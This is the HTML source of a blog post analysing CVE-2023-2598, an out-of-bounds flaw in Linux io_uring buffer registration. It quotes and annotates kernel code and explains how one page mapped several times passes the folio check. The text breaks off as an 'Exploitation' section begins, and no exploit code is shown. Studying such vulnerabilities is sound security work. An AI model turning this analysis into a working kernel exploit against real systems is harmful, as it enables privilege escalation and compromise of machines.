

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="SpongeBob">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2023-2598what’s io_uring?​	io_uring is a system call interface for Linux. It has supported almost all system call so far, not only read() and write initially. It enables an application to initiate">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-2598">
<meta property="og:url" content="http://spongebob-369.github.io/2025/08/20/CVE-2023-2598/index.html">
<meta property="og:site_name" content="SpongeBobの pineapple house">
<meta property="og:description" content="CVE-2023-2598what’s io_uring?​	io_uring is a system call interface for Linux. It has supported almost all system call so far, not only read() and write initially. It enables an application to initiate">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-08-20T03:56:58.000Z">
<meta property="article:modified_time" content="2025-09-17T13:13:10.857Z">
<meta property="article:author" content="SpongeBob">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="io_uring">
<meta property="article:tag" content="EXP">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="OOB">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>CVE-2023-2598 - SpongeBobの pineapple house</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"spongebob-369.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2023-2598"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-20 11:56" pubdate>
          August 20, 2025 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.6k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          13 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2023-2598</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2023-2598"><a href="#CVE-2023-2598" class="headerlink" title="CVE-2023-2598"></a>CVE-2023-2598</h1><h2 id="what’s-io-uring"><a href="#what’s-io-uring" class="headerlink" title="what’s io_uring?"></a>what’s io_uring?</h2><p>​	<code>io_uring</code> is a system call interface for Linux. It has supported almost all system call so far, not only <code>read()</code> and <code>write</code> initially. It enables an application to initiate system calls that can be performed asynchronously.</p>
<span id="more"></span>
<h2 id="Submission-and-Completion-Queues"><a href="#Submission-and-Completion-Queues" class="headerlink" title="Submission and Completion Queues"></a>Submission and Completion Queues</h2><p>At the core of every <code>io_uring</code> implementation sit two ring buffers - the submission queue(SQ) and the completion queue(CQ). Those ring buffers are shared between application and kernel.</p>
<p>We can get a submission queue entry(SQE) which describing a <code>syscall</code> you want to be performed by <code>io_uring_get_sqe</code> . The application then performs an <code>io_uring_enter</code> syscall to effectively tell the kernel that there is work waiting to be done in the submission queue.</p>
<p>After the kernel performs the operation it puts a <em>Completion Queue Entry (CQE)</em> into the completion queue ring buffer which can then be consumed by the application.</p>
<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The function <code>io_sqe_buffer_register</code>  implements the mapping of virtual pages and physical addresses.</p>
<p>We should clarify some concepts first.</p>
<p>The application initiates a request for a buffer by <code>io_uring_register</code>. The call chain is as follows:</p>
<p><code>io_uring_register_buffers</code>-&gt;<code>io_uring_register</code>-&gt;<code>io_sqe_buffers_register</code></p>
<p>The source code of function <code>io_sqe_buffers_register</code> is as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffers_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg,</span><br><span class="hljs-params">			    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_args, u64 __user *tags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">last_hpage</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_rsrc_data</span> *<span class="hljs-title">data</span>;</span><br>	<span class="hljs-type">int</span> i, ret;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br><br>	BUILD_BUG_ON(IORING_MAX_REG_BUFFERS &gt;= (<span class="hljs-number">1u</span> &lt;&lt; <span class="hljs-number">16</span>));<br><br>	<span class="hljs-keyword">if</span> (ctx-&gt;user_bufs)<br>		<span class="hljs-keyword">return</span> -EBUSY;<br>	<span class="hljs-keyword">if</span> (!nr_args || nr_args &gt; IORING_MAX_REG_BUFFERS)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	ret = io_rsrc_node_switch_start(ctx);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	ret = io_rsrc_data_alloc(ctx, io_rsrc_buf_put, tags, nr_args, &amp;data);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	ret = io_buffers_map_alloc(ctx, nr_args);<br>	<span class="hljs-keyword">if</span> (ret) &#123;<br>		io_rsrc_data_free(data);<br>		<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_args; i++, ctx-&gt;nr_user_bufs++) &#123;<br>		<span class="hljs-keyword">if</span> (arg) &#123;<br>			ret = io_copy_iov(ctx, &amp;iov, arg, i);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">break</span>;<br>			ret = io_buffer_validate(&amp;iov);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">break</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-built_in">memset</span>(&amp;iov, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(iov));<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!iov.iov_base &amp;&amp; *io_get_tag_slot(data, i)) &#123;<br>			ret = -EINVAL;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		ret = io_sqe_buffer_register(ctx, &amp;iov, &amp;ctx-&gt;user_bufs[i],<br>					     &amp;last_hpage);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	WARN_ON_ONCE(ctx-&gt;buf_data);<br><br>	ctx-&gt;buf_data = data;<br>	<span class="hljs-keyword">if</span> (ret)<br>		__io_sqe_buffers_unregister(ctx);<br>	<span class="hljs-keyword">else</span><br>		io_rsrc_node_switch(ctx, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>In this function, we will run into <code>io_sqe_buffer_register</code>. And we will find a logical bug. The source code of function <code>io_sqe_buffer_register</code> is as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffer_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-keyword">struct</span> iovec *iov,</span><br><span class="hljs-params">				  <span class="hljs-keyword">struct</span> io_mapped_ubuf **pimu,</span><br><span class="hljs-params">				  <span class="hljs-keyword">struct</span> page **last_hpage)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> *<span class="hljs-title">imu</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> off;<br>	<span class="hljs-type">size_t</span> size;<br>	<span class="hljs-type">int</span> ret, nr_pages, i;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>	*pimu = ctx-&gt;dummy_ubuf;<br>	<span class="hljs-keyword">if</span> (!iov-&gt;iov_base)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	ret = -ENOMEM;<br>	pages = io_pin_pages((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base, iov-&gt;iov_len,<br>				&amp;nr_pages);<br>	<span class="hljs-keyword">if</span> (IS_ERR(pages)) &#123;<br>		ret = PTR_ERR(pages);<br>		pages = <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	<span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry */</span><br>	<span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123;<br>		folio = page_folio(pages[<span class="hljs-number">0</span>]);<br>		<span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br>			<span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123;<br>				folio = <span class="hljs-literal">NULL</span>;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (folio) &#123;<br>			folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>);<br>			nr_pages = <span class="hljs-number">1</span>;<br>		&#125;<br>	&#125;<br><br>	imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL);<br>	<span class="hljs-keyword">if</span> (!imu)<br>		<span class="hljs-keyword">goto</span> done;<br><br>	ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br>	<span class="hljs-keyword">if</span> (ret) &#123;<br>		unpin_user_pages(pages, nr_pages);<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>	size = iov-&gt;iov_len;<br>	<span class="hljs-comment">/* store original address for later verification */</span><br>	imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base;<br>	imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len;<br>	imu-&gt;nr_bvecs = nr_pages;<br>	*pimu = imu;<br>	ret = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (folio) &#123;<br>		bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123;<br>		<span class="hljs-type">size_t</span> vec_len;<br><br>		vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>		bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>		off = <span class="hljs-number">0</span>;<br>		size -= vec_len;<br>	&#125;<br>done:<br>	<span class="hljs-keyword">if</span> (ret)<br>		kvfree(imu);<br>	kvfree(pages);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Here I only mention a few important points.</p>
<ol>
<li><code>imu</code> means virtual address&#x2F;page.</li>
<li><code>page</code> means physical address&#x2F;page.</li>
<li><code>folio</code> means a lot of pages that are continues physically, preventing the situation that when a function is called and its parameter contains a page, but this page belongs to a continuous range of pages, but we are not sure whether to use the whole page or a single page.</li>
<li><code>struct iovec</code> -&gt;  just a structure that describes a buffer, with the start address of the buffer and its length. Nothing more.</li>
<li>An <code>io_mapped_ubuf</code> is a structure that holds the information about a buffer that has been registered to an <code>io_uring</code> instance.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> &#123;</span><br>	u64		ubuf; <span class="hljs-comment">// the address at which the buffer starts</span><br>	u64		ubuf_end; <span class="hljs-comment">// the address at which it ends</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>	nr_bvecs; <span class="hljs-comment">// how many bio_vec(s) are needed to address the buffer </span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	acct_pages;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span>	<span class="hljs-title">bvec</span>[];</span> <span class="hljs-comment">// array of bio_vec(s)</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>The member <code>bio_ver</code> is a <code>struct</code> like <code>iovec</code> but for physical memory.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry */</span><br>	<span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// if more than one page</span><br>		folio = page_folio(pages[<span class="hljs-number">0</span>]); <span class="hljs-comment">// converts from page to folio</span><br>		<span class="hljs-comment">// returns the folio that contains this page</span><br>		<span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br>			<span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123; <span class="hljs-comment">// different folios -&gt; not physically contiguous </span><br>				folio = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// set folio to NULL as we cannot coalesce into a single entry</span><br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// if all the pages are in the same folio</span><br>			folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>); <br>			nr_pages = <span class="hljs-number">1</span>; <span class="hljs-comment">// sets nr_pages to 1 as it can be represented as a single folio page</span><br>		&#125;<br>	&#125;<br>...<br></code></pre></td></tr></table></figure>

<p>The code that checks if the pages are from the same folio doesn’t actually check if they are consecutive. It can be the same page mapped multiple times. During the iteration <code>page_folio(page)</code> would return the same folio again and again passing the checks. This is an obvious logic bug. Let’s continue with <code>io_sqe_buffer_register</code> and see what the fallout is.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>	imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL); <br>	<span class="hljs-comment">// allocates imu with an array for nr_pages bio_vec(s)</span><br>	<span class="hljs-comment">// bio_vec - a contiguous range of physical memory addresses</span><br>	<span class="hljs-comment">// we need a bio_vec for each (physical) page</span><br>    <span class="hljs-comment">// in the case of a folio - the array of bio_vec(s) will be of size 1</span><br>	<span class="hljs-keyword">if</span> (!imu)<br>		<span class="hljs-keyword">goto</span> done;<br><br>	ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br>	<span class="hljs-keyword">if</span> (ret) &#123;<br>		unpin_user_pages(pages, nr_pages);<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>	size = iov-&gt;iov_len; <span class="hljs-comment">// sets the size to that passed by the user!</span><br>	<span class="hljs-comment">/* store original address for later verification */</span><br>	imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base; <span class="hljs-comment">// user-controlled</span><br>	imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len; <span class="hljs-comment">// calculates the end based on the length</span><br>	imu-&gt;nr_bvecs = nr_pages; <span class="hljs-comment">// this would be 1 in the case of folio</span><br>	*pimu = imu;<br>	ret = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// in case of folio - we need just a single bio_vec (efficiant!)</span><br>		bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123; <br>		<span class="hljs-type">size_t</span> vec_len;<br><br>		vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>		bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>		off = <span class="hljs-number">0</span>;<br>		size -= vec_len;<br>	&#125;<br>done:<br>	<span class="hljs-keyword">if</span> (ret)<br>		kvfree(imu);<br>	kvfree(pages);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>A single <code>bio_vec</code> is allocated as <code>nr_pages = 1</code>. The size of the buffer that is written in <code>pimu-&gt;iov_len</code> and <code>pimu-&gt;bvec[0].bv_len</code> is the one passed by the user in <code>iov-&gt;iov_len</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 